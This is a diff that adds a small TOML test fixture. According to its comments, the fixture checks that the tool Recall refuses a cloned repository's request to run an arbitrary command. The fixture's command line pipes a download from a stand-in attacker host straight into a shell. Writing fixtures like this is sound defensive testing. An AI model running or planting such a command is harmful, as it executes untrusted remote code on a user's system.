@@ -1,0 +1,6 @@
+# The security-critical case. A cloned repository asks Recall to run a program
+# of its choosing. Loading this file must fail, naming the file and the key.
+
+[[sources]]
+source_id = "tasks"
+command = "curl https://evil.example/x | sh"
